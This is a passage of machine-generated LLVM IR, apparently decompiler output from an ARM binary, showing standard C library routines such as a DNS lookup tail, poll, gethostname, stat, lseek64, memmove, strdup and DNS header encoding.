  %v1_1cc24 = load i32, i32* @r7, align 4
  %v2_1cc24 = add i32 %v1_1cc24, 16
  %v3_1cc24 = inttoptr i32 %v2_1cc24 to i32*
  store i32 %v0_1cc24, i32* %v3_1cc24, align 4
  %v0_1cc28 = load i32, i32* @r4, align 4
  %v1_1cc28 = load i32, i32* @ip, align 4
  %v2_1cc28 = inttoptr i32 %v1_1cc28 to i32*
  store i32 %v0_1cc28, i32* %v2_1cc28, align 4
  %v0_1cc2c = load i32, i32* @r4, align 4
  %v1_1cc2c = load i32, i32* @r6, align 4
  %v2_1cc2c = add i32 %v1_1cc2c, 4
  %v3_1cc2c = inttoptr i32 %v2_1cc2c to i32*
  store i32 %v0_1cc2c, i32* %v3_1cc2c, align 4
  br label %dec_label_pc_1cd9c

dec_label_pc_1cc34:                               ; preds = %dec_label_pc_1cbc8
  store i32 %storemerge2, i32* %r2.global-to-local, align 4
  %v2_1cc38 = icmp eq i32 %storemerge2, 0
  br i1 %v2_1cc38, label %dec_label_pc_1cc50, label %.thread7

.thread7:                                         ; preds = %dec_label_pc_1cc34
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1cb28, align 4
  br label %dec_label_pc_1cd9c

dec_label_pc_1cc50:                               ; preds = %dec_label_pc_1cc34
  store i32 0, i32* %ip.global-to-local, align 4
  %v0_1cc5c = load i32, i32* @sl, align 4
  store i32 %v0_1cc5c, i32* %r0.global-to-local, align 4
  %v2_1cc64 = ptrtoint i32* %stack_var_-44 to i32
  store i32 %v2_1cc64, i32* %r2.global-to-local, align 4
  %v2_1cc68 = ptrtoint i32* %stack_var_-84 to i32
  store i32 %v2_1cc68, i32* %r3.global-to-local, align 4
  %v7_1cc74 = inttoptr i32 %v0_1cc5c to i8*
  %v8_1cc74 = call i32 @__dns_lookup(i8* %v7_1cc74, i32 1, i32 %v2_1cc64, i32 %v2_1cc68)
  store i32 %v8_1cc74, i32* %r0.global-to-local, align 4
  %v1_1cc78 = icmp slt i32 %v8_1cc74, 0
  br i1 %v1_1cc78, label %.thread, label %dec_label_pc_1cc90

.thread:                                          ; preds = %dec_label_pc_1cc50
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 2, i32* @r5, align 4
  store i32 1, i32* %v1_1cb28, align 4
  br label %dec_label_pc_1cd9c

dec_label_pc_1cc90:                               ; preds = %dec_label_pc_1cc50
  store i32 %tmp12, i32* %r3.global-to-local, align 4
  %v7_1cc94 = icmp eq i32 %tmp12, 1
  br i1 %v7_1cc94, label %dec_label_pc_1cc9c, label %dec_label_pc_1cd74

dec_label_pc_1cc9c:                               ; preds = %dec_label_pc_1cc90
  store i32 0, i32* @r2, align 4
  store i32 12, i32* @r4, align 4
  store i32 12, i32* @r3, align 4
  %v0_1ccb4 = load i32, i32* @r5, align 4
  %v2_1ccb4 = add i32 %v0_1ccb4, -12
  store i32 %v2_1ccb4, i32* @r8, align 4
  %v8_1ccb4 = icmp slt i32 %v2_1ccb4, 0
  br i1 %v8_1ccb4, label %bb37, label %dec_label_pc_1ccc0

bb37:                                             ; preds = %dec_label_pc_1cc9c
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1cd84

dec_label_pc_1ccc0:                               ; preds = %dec_label_pc_1cc9c
  %v0_1ccc0 = load i32, i32* @r6, align 4
  store i32 %v0_1ccc0, i32* @r1, align 4
  %v2_1ccc4 = add i32 %v0_1ccc0, 12
  store i32 %v2_1ccc4, i32* @r0, align 4
  %v2_1ccc8 = call i32 @memmove(i32 %v2_1ccc4, i32 %v0_1ccc0)
  %v0_1cccc = load i32, i32* @fp, align 4
  %v1_1cccc = add i32 %v0_1cccc, 4
  store i32 %v1_1cccc, i32* @r3, align 4
  %v1_1ccd0 = load i32, i32* @r4, align 4
  %v2_1ccd0 = add i32 %v1_1ccd0, %v1_1cccc
  store i32 %v2_1ccd0, i32* @r5, align 4
  store i32 %v2_1ccd0, i32* @r0, align 4
  store i32 4, i32* @r2, align 4
  %v0_1cce0 = call i32 @memcpy()
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v0_1ccec.pre = load i32, i32* @r5, align 4
  br label %dec_label_pc_1ccec

dec_label_pc_1ccec:                               ; preds = %dec_label_pc_1ccec, %dec_label_pc_1ccc0
  %v0_1ccec = phi i32 [ %v0_1ccec.pre, %dec_label_pc_1ccc0 ], [ %v1_1ccf0, %dec_label_pc_1ccec ]
  %v1_1ccec = load i32, i32* @r6, align 4
  %v7_1ccec = inttoptr i32 %v1_1ccec to i32*
  store i32 %v0_1ccec, i32* %v7_1ccec, align 4
  %v0_1ccf0 = load i32, i32* @r5, align 4
  %v1_1ccf0 = add i32 %v0_1ccf0, 4
  store i32 %v1_1ccf0, i32* @r5, align 4
  %v0_1ccf4 = load i32, i32* %r0.global-to-local, align 4
  %v1_1ccf4 = add i32 %v0_1ccf4, 1
  store i32 %v1_1ccf4, i32* %r0.global-to-local, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %tmp38 = icmp eq i32 %v1_1ccf4, 0
  br i1 %tmp38, label %dec_label_pc_1ccec, label %dec_label_pc_1cd04

dec_label_pc_1cd04:                               ; preds = %dec_label_pc_1ccec
  %v3_1cd04 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1cd04, i32* @r4, align 4
  store i32 0, i32* %r3.global-to-local, align 4
  %v2_1cd0c = icmp eq i32 %v3_1cd04, 0
  %v1_1cd10 = load i32, i32* @r6, align 4
  %v5_1cd10 = mul i32 %v1_1ccf4, 4
  %v6_1cd10 = add i32 %v1_1cd10, %v5_1cd10
  %v7_1cd10 = inttoptr i32 %v6_1cd10 to i32*
  store i32 0, i32* %v7_1cd10, align 4
  br i1 %v2_1cd0c, label %dec_label_pc_1cd40, label %dec_label_pc_1cd18

dec_label_pc_1cd18:                               ; preds = %dec_label_pc_1cd04
  %v0_1cd18 = load i32, i32* @r4, align 4
  %v1_1cd18 = inttoptr i32 %v0_1cd18 to i8*
  store i32 %v0_1cd18, i32* %r0.global-to-local, align 4
  %v3_1cd1c = call i32 @strlen(i8* %v1_1cd18)
  store i32 %v3_1cd1c, i32* %r0.global-to-local, align 4
  %v0_1cd20 = load i32, i32* @r8, align 4
  %tmp = icmp ugt i32 %v0_1cd20, %v3_1cd1c
  br i1 %tmp, label %dec_label_pc_1cd28, label %dec_label_pc_1cd40

dec_label_pc_1cd28:                               ; preds = %dec_label_pc_1cd18
  %v0_1cd28 = load i32, i32* @r4, align 4
  store i32 %v0_1cd28, i32* @r1, align 4
  %v0_1cd2c = load i32, i32* @r5, align 4
  store i32 %v0_1cd2c, i32* %r0.global-to-local, align 4
  %v2_1cd30 = inttoptr i32 %v0_1cd2c to i8*
  %v3_1cd30 = call i32 @strcpy(i8* %v2_1cd30, i32 %v0_1cd28)
  store i32 %v3_1cd30, i32* %r0.global-to-local, align 4
  %v0_1cd34 = load i32, i32* @r5, align 4
  br label %dec_label_pc_1cd40

dec_label_pc_1cd40:                               ; preds = %dec_label_pc_1cd18, %dec_label_pc_1cd04, %dec_label_pc_1cd28
  %storemerge1 = phi i32 [ %v0_1cd34, %dec_label_pc_1cd28 ], [ %v0_1cabc, %dec_label_pc_1cd18 ], [ %v0_1cabc, %dec_label_pc_1cd04 ]
  store i32 %storemerge1, i32* %r0.global-to-local, align 4
  store i32 2, i32* %r2.global-to-local, align 4
  %v1_1cd44 = load i32, i32* @r7, align 4
  %v2_1cd44 = add i32 %v1_1cd44, 8
  %v3_1cd44 = inttoptr i32 %v2_1cd44 to i32*
  store i32 2, i32* %v3_1cd44, align 4
  %v0_1cd48 = load i32, i32* %r2.global-to-local, align 4
  %v2_1cd48 = mul i32 %v0_1cd48, 2
  store i32 0, i32* %r3.global-to-local, align 4
  %v1_1cd50 = load i32, i32* @r7, align 4
  %v2_1cd50 = add i32 %v1_1cd50, 12
  %v3_1cd50 = inttoptr i32 %v2_1cd50 to i32*
  store i32 %v2_1cd48, i32* %v3_1cd50, align 4
  %v3_1cd54 = load i32, i32* %stack_var_0, align 4
  store i32 %v3_1cd54, i32* @ip, align 4
  store i32 %tmp18, i32* %r2.global-to-local, align 4
  %v0_1cd5c = load i32, i32* %r3.global-to-local, align 4
  store i32 %v0_1cd5c, i32* @r5, align 4
  %v0_1cd60 = load i32, i32* @r7, align 4
  %v2_1cd60 = inttoptr i32 %v3_1cd54 to i32*
  store i32 %v0_1cd60, i32* %v2_1cd60, align 4
  %v0_1cd64 = load i32, i32* @r7, align 4
  %v1_1cd64 = inttoptr i32 %v0_1cd64 to i32*
  %v2_1cd64 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v2_1cd64, i32* %v1_1cd64, align 4
  %v3_1cd64 = add i32 %v0_1cd64, 4
  %v4_1cd64 = inttoptr i32 %v3_1cd64 to i32*
  %v5_1cd64 = load i32, i32* @fp, align 4
  store i32 %v5_1cd64, i32* %v4_1cd64, align 4
  %v0_1cd68 = load i32, i32* @r6, align 4
  %v1_1cd68 = load i32, i32* @r7, align 4
  %v2_1cd68 = add i32 %v1_1cd68, 16
  %v3_1cd68 = inttoptr i32 %v2_1cd68 to i32*
  store i32 %v0_1cd68, i32* %v3_1cd68, align 4
  %v0_1cd6c = load i32, i32* %r3.global-to-local, align 4
  %v1_1cd6c = load i32, i32* %r2.global-to-local, align 4
  %v2_1cd6c = inttoptr i32 %v1_1cd6c to i32*
  store i32 %v0_1cd6c, i32* %v2_1cd6c, align 4
  br label %dec_label_pc_1cd84

dec_label_pc_1cd74:                               ; preds = %dec_label_pc_1cc90
  store i32 %tmp18, i32* @ip, align 4
  store i32 1, i32* %r3.global-to-local, align 4
  store i32 1, i32* %v1_1cb28, align 4
  store i32 2, i32* @r5, align 4
  br label %dec_label_pc_1cd84

dec_label_pc_1cd84:                               ; preds = %bb37, %dec_label_pc_1cd40, %dec_label_pc_1cd74
  %v3_1cd84 = load i32, i32* %stack_var_-84, align 4
  store i32 %v3_1cd84, i32* @r0, align 4
  %v0_1cd88 = call i32 @free()
  %v3_1cd8c = load i32, i32* %stack_var_-44, align 4
  store i32 %v3_1cd8c, i32* @r0, align 4
  %v0_1cd90 = call i32 @free()
  store i32 %v0_1cd90, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1cd9c

dec_label_pc_1cd98:                               ; preds = %dec_label_pc_1cb70, %dec_label_pc_1cb94
  store i32 34, i32* @r5, align 4
  br label %dec_label_pc_1cd9c

dec_label_pc_1cd9c:                               ; preds = %.thread, %bb, %bb34, %.thread7, %dec_label_pc_1cb5c, %dec_label_pc_1cb3c, %dec_label_pc_1cd84, %dec_label_pc_1cbf8, %dec_label_pc_1cd98
  %v0_1cd9c = load i32, i32* @r5, align 4
  store i32 %v0_1cd9c, i32* %r0.global-to-local, align 4
  ret i32 %v0_1cd9c

; uselistorder directives
  uselistorder i32 %v0_1cd18, { 1, 0 }
  uselistorder i32 %v1_1ccf4, { 1, 0, 2 }
  uselistorder i32 %v1_1ccf0, { 1, 0 }
  uselistorder i32 %v0_1ccc0, { 1, 0, 2 }
  uselistorder i32 %v2_1ccb4, { 1, 0 }
  uselistorder i32 %v1_1cbb4, { 2, 1, 0 }
  uselistorder i32 %v1_1cba8, { 1, 0 }
  uselistorder i32 %v0_1cb7c, { 1, 0 }
  uselistorder i32 %storemerge2, { 1, 0 }
  uselistorder i32* %v1_1cb28, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1cac8, { 1, 0 }
  uselistorder i32 %v0_1cabc, { 1, 2, 3, 5, 4, 0, 6, 8, 7 }
  uselistorder i32* %stack_var_0, { 1, 2, 3, 0 }
  uselistorder i32 %tmp18, { 9, 8, 7, 6, 5, 4, 3, 2, 0, 1 }
  uselistorder i32 %tmp12, { 1, 0 }
  uselistorder i32* %r3.global-to-local, { 0, 1, 2, 3, 4, 5, 19, 6, 7, 8, 9, 10, 11, 12, 13, 14, 16, 15, 17, 18 }
  uselistorder i32* %r0.global-to-local, { 0, 1, 17, 18, 3, 2, 5, 4, 6, 19, 20, 8, 7, 10, 9, 11, 13, 12, 15, 14, 16 }
  uselistorder i32 ()* @free, { 23, 22, 21, 20, 19, 18, 12, 11, 10, 9, 8, 7, 6, 5, 4, 24, 30, 29, 28, 17, 16, 15, 14, 1, 13, 27, 26, 25, 3, 2, 0 }
  uselistorder i32 (i32, i32, i32, i32, i32, i32, i32)* @__get_hosts_byname_r, { 1, 0 }
  uselistorder label %dec_label_pc_1cd9c, { 8, 6, 0, 3, 7, 4, 5, 2, 1 }
  uselistorder label %dec_label_pc_1cd98, { 1, 0 }
  uselistorder label %dec_label_pc_1cd84, { 2, 1, 0 }
  uselistorder label %dec_label_pc_1cd40, { 2, 0, 1 }
  uselistorder label %dec_label_pc_1cb70, { 2, 0, 1 }
}

define i32 @__GI_poll(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5, i32 %arg6) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  %stack_var_-8 = alloca i32, align 4
  %v3_1cdac = load i32, i32* @r7, align 4
  store i32 %v3_1cdac, i32* %stack_var_-8, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1cdd4, label %dec_label_pc_1cdc4

dec_label_pc_1cdc4:                               ; preds = %entry
  %v0_1cdc4 = call i32 @__GI___errno_location()
  %v0_1cdc8 = load i32, i32* %r7.global-to-local, align 4
  %v1_1cdc8 = sub i32 0, %v0_1cdc8
  %v2_1cdcc = inttoptr i32 %v0_1cdc4 to i32*
  store i32 %v1_1cdc8, i32* %v2_1cdcc, align 4
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1cdd8.pre = load i32, i32* %stack_var_-8, align 4
  br label %dec_label_pc_1cdd4

dec_label_pc_1cdd4:                               ; preds = %entry, %dec_label_pc_1cdc4
  %v2_1cdd8 = phi i32 [ %v3_1cdac, %entry ], [ %v2_1cdd8.pre, %dec_label_pc_1cdc4 ]
  %v0_1cdd4 = phi i32 [ %arg1, %entry ], [ -1, %dec_label_pc_1cdc4 ]
  store i32 %v2_1cdd8, i32* @r7, align 4
  ret i32 %v0_1cdd4

; uselistorder directives
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1cdd4, { 1, 0 }
}

define i32 @__GI_gethostname(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r5.global-to-local = alloca i32, align 4
  %r6.global-to-local = alloca i32, align 4
  %stack_var_-341 = alloca i32, align 4
  %stack_var_-406 = alloca i32, align 4
  %v2_1cdec = ptrtoint i32* %stack_var_-406 to i32
  store i32 %arg1, i32* %r6.global-to-local, align 4
  store i32 %arg2, i32* %r5.global-to-local, align 4
  %v1_1cdfc = call i32 @uname(i32 %v2_1cdec)
  %v7_1ce00 = icmp eq i32 %v1_1cdfc, -1
  br i1 %v7_1ce00, label %bb, label %dec_label_pc_1ce0c

bb:                                               ; preds = %entry
  store i32 %v1_1cdfc, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ce48

dec_label_pc_1ce0c:                               ; preds = %entry
  %v2_1ce0c = ptrtoint i32* %stack_var_-341 to i32
  %tmp10 = bitcast i32* %stack_var_-341 to i8*
  %v3_1ce14 = call i32 @strlen(i8* %tmp10)
  %v1_1ce18 = add i32 %v3_1ce14, 1
  %v1_1ce1c = load i32, i32* %r5.global-to-local, align 4
  %tmp = icmp ugt i32 %v1_1ce18, %v1_1ce1c
  br i1 %tmp, label %dec_label_pc_1ce24, label %dec_label_pc_1ce38

dec_label_pc_1ce24:                               ; preds = %dec_label_pc_1ce0c
  %v0_1ce24 = call i32 @__GI___errno_location()
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1ce30 = inttoptr i32 %v0_1ce24 to i32*
  store i32 22, i32* %v2_1ce30, align 4
  %v0_1ce48.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ce48

dec_label_pc_1ce38:                               ; preds = %dec_label_pc_1ce0c
  %v0_1ce38 = load i32, i32* %r6.global-to-local, align 4
  store i32 %v2_1ce0c, i32* @r1, align 4
  %v2_1ce40 = inttoptr i32 %v0_1ce38 to i8*
  %v3_1ce40 = call i32 @strcpy(i8* %v2_1ce40, i32 %v2_1ce0c)
  store i32 0, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1ce48

dec_label_pc_1ce48:                               ; preds = %bb, %dec_label_pc_1ce24, %dec_label_pc_1ce38
  %v0_1ce48 = phi i32 [ %v1_1cdfc, %bb ], [ %v0_1ce48.pre, %dec_label_pc_1ce24 ], [ 0, %dec_label_pc_1ce38 ]
  ret i32 %v0_1ce48

; uselistorder directives
  uselistorder i32 %v2_1ce0c, { 1, 0 }
  uselistorder i32 %v1_1cdfc, { 1, 2, 0 }
  uselistorder i32 (i8*, i32)* @strcpy, { 5, 6, 7, 0, 1, 2, 3, 4, 8 }
  uselistorder i32 22, { 3, 17, 4, 5, 19, 6, 7, 8, 9, 15, 10, 11, 12, 16, 13, 0, 18, 14, 1, 2, 20 }
  uselistorder label %dec_label_pc_1ce48, { 2, 1, 0 }
}

define i32 @__GI_stat(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %r7.global-to-local = alloca i32, align 4
  store i32 %arg1, i32* %r7.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1ce90, label %dec_label_pc_1ce7c

dec_label_pc_1ce7c:                               ; preds = %entry
  %v0_1ce7c = call i32 @__GI___errno_location()
  %v0_1ce80 = load i32, i32* %r7.global-to-local, align 4
  %v1_1ce80 = sub i32 0, %v0_1ce80
  store i32 -1, i32* %r7.global-to-local, align 4
  %v2_1ce88 = inttoptr i32 %v0_1ce7c to i32*
  store i32 %v1_1ce80, i32* %v2_1ce88, align 4
  br label %dec_label_pc_1cea0

dec_label_pc_1ce90:                               ; preds = %entry
  %v2_1ce90 = icmp eq i32 %arg1, 0
  br i1 %v2_1ce90, label %bb, label %.thread

bb:                                               ; preds = %dec_label_pc_1ce90
  br label %.thread

.thread:                                          ; preds = %dec_label_pc_1ce90, %bb
  call void @__pseudo_cond_branch(i1 %v2_1ce90, i32 ptrtoint (i32* @global_var_1afa4.1149 to i32))
  br label %dec_label_pc_1cea0

dec_label_pc_1cea0:                               ; preds = %dec_label_pc_1ce7c, %.thread
  %v0_1cea0 = load i32, i32* %r7.global-to-local, align 4
  ret i32 %v0_1cea0

; uselistorder directives
  uselistorder i32* %r7.global-to-local, { 1, 0, 2, 3 }
  uselistorder i32 %arg1, { 1, 0, 2 }
  uselistorder label %dec_label_pc_1cea0, { 1, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__GI_lseek64(i32 %arg1, i32 %arg2, i32 %arg3, i32 %arg4) local_unnamed_addr {
entry:
  %r2.global-to-local = alloca i32, align 4
  %r4.global-to-local = alloca i32, align 4
  %tmp8 = call i32 @__decompiler_undefined_function_0()
  store i32 %arg1, i32* %r4.global-to-local, align 4
  %tmp = icmp ult i32 %arg1, -4095
  br i1 %tmp, label %dec_label_pc_1cef0, label %dec_label_pc_1cedc

dec_label_pc_1cedc:                               ; preds = %entry
  %v0_1cedc = call i32 @__GI___errno_location()
  %v0_1cee0 = load i32, i32* %r4.global-to-local, align 4
  %v1_1cee0 = sub i32 0, %v0_1cee0
  store i32 -1, i32* %r2.global-to-local, align 4
  %v2_1cee8 = inttoptr i32 %v0_1cedc to i32*
  store i32 %v1_1cee0, i32* %v2_1cee8, align 4
  %v0_1cef8.pre = load i32, i32* %r2.global-to-local, align 4
  br label %dec_label_pc_1cef8

dec_label_pc_1cef0:                               ; preds = %entry
  store i32 %arg1, i32* %r2.global-to-local, align 4
  %v2_1cef0 = icmp eq i32 %arg1, 0
  br i1 %v2_1cef0, label %dec_label_pc_1cf04, label %dec_label_pc_1cef8

dec_label_pc_1cef8:                               ; preds = %dec_label_pc_1cef0, %dec_label_pc_1cedc
  %v0_1cef8 = phi i32 [ %arg1, %dec_label_pc_1cef0 ], [ %v0_1cef8.pre, %dec_label_pc_1cedc ]
  br label %dec_label_pc_1cf08

dec_label_pc_1cf04:                               ; preds = %dec_label_pc_1cef0
  br label %dec_label_pc_1cf08

dec_label_pc_1cf08:                               ; preds = %dec_label_pc_1cef8, %dec_label_pc_1cf04
  %v1_1cf10 = phi i32 [ %v0_1cef8, %dec_label_pc_1cef8 ], [ %tmp8, %dec_label_pc_1cf04 ]
  ret i32 %v1_1cf10

; uselistorder directives
  uselistorder i32 %arg1, { 1, 2, 3, 0, 4 }
  uselistorder label %dec_label_pc_1cf08, { 1, 0 }
}

define i32 @memmove(i32 %arg1, i32 %arg2) local_unnamed_addr {
entry:
  %v0_1cf20 = load i32, i32* @r0, align 4
  %v1_1cf20 = load i32, i32* @r1, align 4
  %v2_1cf20 = inttoptr i32 %v0_1cf20 to i8*
  %v3_1cf20 = call i32 @_memcpy(i8* %v2_1cf20, i32 %v1_1cf20)
  ret i32 %v3_1cf20

; uselistorder directives
  uselistorder i32 (i8*, i32)* @_memcpy, { 0, 2, 1 }
}

define i32 @__GI_strdup(i8* %arg1) local_unnamed_addr {
entry:
  %r5.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i8* %arg1 to i32
  %stack_var_-16 = alloca i32, align 4
  %v3_1cf30 = load i32, i32* @r4, align 4
  store i32 %v3_1cf30, i32* %stack_var_-16, align 4
  %v9_1cf30 = load i32, i32* @r6, align 4
  store i32 %tmp, i32* @r6, align 4
  %v3_1cf38 = call i32 @strlen(i8* %arg1)
  %v1_1cf3c = add i32 %v3_1cf38, 1
  store i32 %v1_1cf3c, i32* @r4, align 4
  %v1_1cf44 = call i32 @malloc(i32 %v1_1cf3c)
  store i32 %v1_1cf44, i32* %r5.global-to-local, align 4
  %v2_1cf48 = icmp eq i32 %v1_1cf44, 0
  br i1 %v2_1cf48, label %.thread, label %bb

bb:                                               ; preds = %entry
  br label %.thread

.thread:                                          ; preds = %entry, %bb
  %v1_1cf54 = xor i1 %v2_1cf48, true
  call void @__pseudo_cond_branch(i1 %v1_1cf54, i32 ptrtoint (i32* @global_var_14d20.1072 to i32))
  %v0_1cf58 = load i32, i32* %r5.global-to-local, align 4
  %v2_1cf5c = load i32, i32* %stack_var_-16, align 4
  store i32 %v2_1cf5c, i32* @r4, align 4
  store i32 %v9_1cf30, i32* @r6, align 4
  ret i32 %v0_1cf58

; uselistorder directives
  uselistorder i32 (i32)* @malloc, { 14, 13, 12, 6, 5, 15, 16, 22, 11, 10, 9, 1, 8, 7, 21, 20, 19, 18, 17, 4, 3, 2, 0 }
  uselistorder label %.thread, { 1, 0 }
}

define i32 @__encode_header(i32* %arg1, i32 %arg2, i32 %arg3, i32 %arg4, i32 %arg5) local_unnamed_addr {
entry:
  %ip.global-to-local = alloca i32, align 4
  %lr.global-to-local = alloca i32, align 4
  %tmp = ptrtoint i32* %arg1 to i32
  %stack_var_-4 = alloca i32, align 4
  %v0_1cf68 = load i32, i32* @lr, align 4
  store i32 %v0_1cf68, i32* %stack_var_-4, align 4
  store i32 %tmp, i32* %ip.global-to-local, align 4
  store i32 %arg2, i32* %lr.global-to-local, align 4
  %v7_1cf74 = icmp sgt i32 %arg3, 11
  br i1 %v7_1cf74, label %dec_label_pc_1cf7c, label %dec_label_pc_1d048

dec_label_pc_1cf7c:                               ; preds = %entry
  %tmp16 = inttoptr i32 %arg2 to i8*
  %v1_1cf7c = add i32 %tmp, 1
  %v2_1cf7c = inttoptr i32 %v1_1cf7c to i8*
  %v3_1cf7c = load i8, i8* %v2_1cf7c, align 1
  store i8 %v3_1cf7c, i8* %tmp16, align 1
  %v0_1cf84 = load i32, i32* %ip.global-to-local, align 4
  %v1_1cf84 = inttoptr i32 %v0_1cf84 to i32*
  %v2_1cf84 = load i32, i32* %v1_1cf84, align 4
  %v1_1cf88 = trunc i32 %v2_1cf84 to i8
  %v4_1cf88 = add i32 %arg2, 1
  %v5_1cf88 = inttoptr i32 %v4_1cf88 to i8*
  store i8 %v1_1cf88, i8* %v5_1cf88, align 1
  %v0_1cf8c = load i32, i32* %ip.global-to-local, align 4
  %v1_1cf8c = add i32 %v0_1cf8c, 8
  %v2_1cf8c = inttoptr i32 %v1_1cf8c to i32*
  %v3_1cf8c = load i32, i32* %v2_1cf8c, align 4
  %v1_1cf90 = add i32 %v0_1cf8c, 20
  %v2_1cf90 = inttoptr i32 %v1_1cf90 to i32*
  %v3_1cf90 = load i32, i32* %v2_1cf90, align 4
  %v1_1cf94 = add i32 %v0_1cf8c, 4
  %v2_1cf94 = inttoptr i32 %v1_1cf94 to i32*
  %v3_1cf94 = load i32, i32* %v2_1cf94, align 4
  %v1_1cf98 = add i32 %v0_1cf8c, 12
  %v2_1cf98 = inttoptr i32 %v1_1cf98 to i32*
  %v3_1cf98 = load i32, i32* %v2_1cf98, align 4
  %v2_1cf9c = icmp eq i32 %v3_1cf90, 0
  br i1 %v2_1cf9c, label %bb17, label %bb

bb:                                               ; preds = %dec_label_pc_1cf7c
  br label %bb17

bb17:                                             ; preds = %dec_label_pc_1cf7c, %bb
  %v0_1cfac = phi i32 [ 0, %dec_label_pc_1cf7c ], [ 1, %bb ]
  %v1_1cfa4 = urem i32 %v3_1cf8c, 16
  %v2_1cfa8 = icmp eq i32 %v3_1cf94, 0
  %v4_1cfac = mul nuw nsw i32 %v1_1cfa4, 8
  %v5_1cfac = or i32 %v0_1cfac, %v4_1cfac
  %v1_1cfb0 = add i32 %v0_1cf8c, 16
  %v2_1cfb0 = inttoptr i32 %v1_1cfb0 to i32*
  %v3_1cfb0 = load i32, i32* %v2_1cfb0, align 4
  %. = select i1 %v2_1cfa8, i32 0, i32 128
  %v2_1cfbc = icmp eq i32 %v3_1cf98, 0
  %storemerge11 = select i1 %v2_1cfbc, i32 0, i32 4
  %v2_1cfc8 = or i32 %v5_1cfac, %.
  %v2_1cfcc = icmp eq i32 %v3_1cfb0, 0
  %.26 = select i1 %v2_1cfcc, i32 0, i32 2
  %v2_1cfd8 = or i32 %v2_1cfc8, %storemerge11
  %v2_1cfdc = or i32 %v2_1cfd8, %.26
  %v1_1cfe0 = trunc i32 %v2_1cfdc to i8
  %v2_1cfe0 = load i32, i32* %lr.global-to-local, align 4
  %v3_1cfe0 = add i32 %v2_1cfe0, 2
  %v4_1cfe0 = inttoptr i32 %v3_1cfe0 to i8*
  store i8 %v1_1cfe0, i8* %v4_1cfe0, align 1
  %v0_1cfe4 = load i32, i32* %ip.global-to-local, align 4
  %v1_1cfe4 = add i32 %v0_1cfe4, 24
  %v1_1cfe8 = inttoptr i32 %v1_1cfe4 to i32*
  %v2_1cfe8 = load i32, i32* %v1_1cfe8, align 4
  %v3_1cfe8 = add i32 %v0_1cfe4, 28
  %v4_1cfe8 = inttoptr i32 %v3_1cfe8 to i32*
  %v5_1cfe8 = load i32, i32* %v4_1cfe8, align 4
  %v2_1cfec = icmp eq i32 %v2_1cfe8, 0
  %v1_1cff0 = urem i32 %v5_1cfe8, 16
  %v0_1cffc = select i1 %v2_1cfec, i32 0, i32 128
  %v2_1cffc = or i32 %v1_1cff0, %v0_1cffc
  %v1_1d000 = trunc i32 %v2_1cffc to i8
  %v2_1d000 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d000 = add i32 %v2_1d000, 3
  %v4_1d000 = inttoptr i32 %v3_1d000 to i8*
  store i8 %v1_1d000, i8* %v4_1d000, align 1
  %v0_1d004 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d004 = add i32 %v0_1d004, 33
  %v2_1d004 = inttoptr i32 %v1_1d004 to i8*
  %v3_1d004 = load i8, i8* %v2_1d004, align 1
  %v2_1d008 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d008 = add i32 %v2_1d008, 4
  %v4_1d008 = inttoptr i32 %v3_1d008 to i8*
  store i8 %v3_1d004, i8* %v4_1d008, align 1
  %v0_1d00c = load i32, i32* %ip.global-to-local, align 4
  %v1_1d00c = add i32 %v0_1d00c, 32
  %v2_1d00c = inttoptr i32 %v1_1d00c to i32*
  %v3_1d00c = load i32, i32* %v2_1d00c, align 4
  %v1_1d010 = trunc i32 %v3_1d00c to i8
  %v2_1d010 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d010 = add i32 %v2_1d010, 5
  %v4_1d010 = inttoptr i32 %v3_1d010 to i8*
  store i8 %v1_1d010, i8* %v4_1d010, align 1
  %v0_1d014 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d014 = add i32 %v0_1d014, 37
  %v2_1d014 = inttoptr i32 %v1_1d014 to i8*
  %v3_1d014 = load i8, i8* %v2_1d014, align 1
  %v2_1d018 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d018 = add i32 %v2_1d018, 6
  %v4_1d018 = inttoptr i32 %v3_1d018 to i8*
  store i8 %v3_1d014, i8* %v4_1d018, align 1
  %v0_1d01c = load i32, i32* %ip.global-to-local, align 4
  %v1_1d01c = add i32 %v0_1d01c, 36
  %v2_1d01c = inttoptr i32 %v1_1d01c to i32*
  %v3_1d01c = load i32, i32* %v2_1d01c, align 4
  %v1_1d020 = trunc i32 %v3_1d01c to i8
  %v2_1d020 = load i32, i32* %lr.global-to-local, align 4
  %v3_1d020 = add i32 %v2_1d020, 7
  %v4_1d020 = inttoptr i32 %v3_1d020 to i8*
  store i8 %v1_1d020, i8* %v4_1d020, align 1
  %v0_1d024 = load i32, i32* %ip.global-to-local, align 4
  %v1_1d024 = add i32 %v0_1d024, 41
